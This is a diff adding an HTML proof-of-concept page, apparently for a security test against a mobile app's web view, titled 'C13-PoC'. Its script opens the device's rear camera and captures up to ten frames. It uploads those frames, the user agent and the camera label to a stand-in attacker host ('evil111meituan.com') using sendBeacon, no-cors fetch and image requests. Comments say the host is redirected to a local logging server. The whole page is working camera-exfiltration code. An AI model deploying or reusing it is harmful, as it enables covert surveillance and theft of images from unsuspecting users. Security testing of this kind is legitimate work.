@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>C13-PoC · GitHub Pages · 后置</title>
+</head>
+<body style="margin:0;background:#000;color:#0f0;font:12px/1.5 monospace;padding:8px">
+<div id="s">[gh-back] 初始化…</div>
+<div id="log" style="max-height:30vh;overflow:auto"></div>
+<video id="v" autoplay playsinline muted style="width:100%;max-width:360px"></video>
+<div id="frames"></div>
+<script>
+(function () {
+  'use strict';
+  var TAG    = 'gh-back';
+  // 数据回传通道(经 Charles/hosts 指向本地服务 80 端口留痕)
+  var UPLINK = 'http://evil111meituan.com';
+  var CAMERA = { facingMode: { ideal: 'environment' } };
+
+  var s = document.getElementById('s');
+  var lg = document.getElementById('log');
+  var v = document.getElementById('v');
+  var fr = document.getElementById('frames');
+  var t0 = Date.now();
+
+  function log(h, c) {
+    s.textContent = '[' + TAG + '] ' + h;
+    s.style.color = c || '#0f0';
+    var d = document.createElement('div');
+    d.textContent = (Date.now() - t0) + 'ms ' + h;
+    d.style.color = c || '#0f0';
+    lg.appendChild(d);
+  }
+
+  // 通道1:sendBeacon POST text/plain(免 CORS 预检,服务端按原始 body 留痕)
+  // 通道2:<img> GET 兜底(仅小数据摘要)
+  function report(stage, obj) {
+    obj.stage = stage; obj.tag = TAG; obj.secure = window.isSecureContext;
+    var txt = JSON.stringify(obj);
+    var url = UPLINK + '/capture/' + TAG + '-' + stage + '.json';
+    var sent = 'none';
+    try {
+      if (navigator.sendBeacon && navigator.sendBeacon(url, new Blob([txt], { type: 'text/plain' }))) {
+        sent = 'beacon';
+      }
+    } catch (e) {}
+    try {
+      var img = new Image();
+      img.onload  = function () { log('上报[' + stage + '] img-GET ✅'); };
+      img.onerror = function () { log('上报[' + stage + '] img-GET ❌(混合内容被拦?)', '#f55'); };
+      img.src = url + '?img=1&d=' + encodeURIComponent(txt.slice(0, 1500));
+      if (sent === 'none') sent = 'img';
+    } catch (e) {}
+    log('上报[' + stage + '] 通道=' + sent, '#ff0');
+  }
+
+  function uploadFrame(b64, idx) {
+    var url = UPLINK + '/capture/' + TAG + '-frame-' + idx + '.b64';
+    try {
+      if (navigator.sendBeacon && navigator.sendBeacon(url, new Blob([b64], { type: 'text/plain' }))) {
+        log('帧' + idx + ' beacon ✅(' + b64.length + 'B)');
+        return;
+      }
+    } catch (e) {}
+    try {
+      fetch(url, { method: 'POST', mode: 'no-cors', body: b64 })
+        .then(function () { log('帧' + idx + ' fetch ✅'); })
+        .catch(function (e) { log('帧' + idx + ' fetch ❌ ' + e.message, '#f55'); });
+    } catch (e) { log('帧' + idx + ' 上报异常 ' + e.message, '#f55'); }
+  }
+
+  log('secure=' + window.isSecureContext + ' md=' + !!navigator.mediaDevices);
+  var p = (navigator.mediaDevices && navigator.mediaDevices.getUserMedia)
+        ? navigator.mediaDevices.getUserMedia({ video: CAMERA, audio: false })
+        : Promise.reject(new Error('getUserMedia unavailable'));
+
+  p.then(function (stream) {
+    var track = stream.getVideoTracks()[0];
+    var st = track.getSettings ? track.getSettings() : {};
+    report('camera-ok', { w: st.width, h: st.height, label: track.label, ua: navigator.userAgent });
+    log('✅ 摄像头 ' + st.width + 'x' + st.height + ' [' + track.label + ']');
+    try { v.srcObject = stream; } catch (e) {}
+
+    var ic = null;
+    try { if (window.ImageCapture) ic = new ImageCapture(track); } catch (e) {}
+
+    var got = 0;
+    function grabOnce() {
+      if (got >= 10) { report('done', { frames: got }); log('✅ 完成 ' + got + ' 帧'); return; }
+      var done = false;
+      setTimeout(function () { if (!done) { done = true; report('grab-timeout', { idx: got }); grabOnce(); } }, 2500);
+      try {
+        ic.grabFrame().then(function (bmp) {
+          if (done) return; done = true;
+          var scale = Math.min(1, 320 / (bmp.width || 640));
+          var cv = document.createElement('canvas');
+          cv.width = Math.round((bmp.width || 640) * scale);
+          cv.height = Math.round((bmp.height || 480) * scale);
+          cv.getContext('2d').drawImage(bmp, 0, 0, cv.width, cv.height);
+          try { bmp.close && bmp.close(); } catch (e) {}
+          cv.toBlob(function (b) {
+            if (!b) { report('toblob-null', { idx: got }); grabOnce(); return; }
+            var rd = new FileReader();
+            rd.onload = function () {
+              var b64 = String(rd.result).split(',')[1] || '';
+              got++;
+              // 视觉证据:帧直接渲染在页面上(不依赖上报)
+              var im = document.createElement('img');
+              im.src = 'data:image/jpeg;base64,' + b64;
+              im.style.cssText = 'width:32%;margin:1px;border:1px solid #0f0';
+              fr.appendChild(im);
+              uploadFrame(b64, got);
+              grabOnce();
+            };
+            rd.readAsDataURL(b);
+          }, 'image/jpeg', 0.5);
+        }).catch(function (e) {
+          if (done) return; done = true;
+          report('grab-error', { err: e.name + ':' + e.message });
+          grabOnce();
+        });
+      } catch (e) { if (!done) { done = true; report('grab-throw', { err: e.message }); grabOnce(); } }
+    }
+
+    if (ic) { log('● ImageCapture 模式', '#ff0'); setTimeout(grabOnce, 800); }
+    else {
+      // 兜底:video+canvas
+      log('● 回退 video+canvas', '#ff0');
+      setTimeout(function () {
+        var cv2 = document.createElement('canvas');
+        cv2.width = 320; cv2.height = 240;
+        var ctx = cv2.getContext('2d');
+        var iv = setInterval(function () {
+          if (got >= 10) { clearInterval(iv); report('done', { frames: got, mode: 'canvas' }); log('✅ 完成 ' + got + ' 帧'); return; }
+          try {
+            ctx.drawImage(v, 0, 0, 320, 240);
+            cv2.toBlob(function (b) {
+              if (!b) return;
+              var rd = new FileReader();
+              rd.onload = function () {
+                got++;
+                var b64 = String(rd.result).split(',')[1] || '';
+                var im = document.createElement('img');
+                im.src = 'data:image/jpeg;base64,' + b64;
+                im.style.cssText = 'width:32%;margin:1px;border:1px solid #0f0';
+                fr.appendChild(im);
+                uploadFrame(b64, got);
+              };
+              rd.readAsDataURL(b);
+            }, 'image/jpeg', 0.5);
+          } catch (e) { report('canvas-error', { err: e.message }); clearInterval(iv); }
+        }, 300);
+      }, 1000);
+    }
+  }).catch(function (err) {
+    report('camera-fail', { name: err.name, message: err.message });
+    log('❌ ' + err.name + ': ' + err.message, '#f55');
+  });
+})();
+</script>
+</body>
+</html>
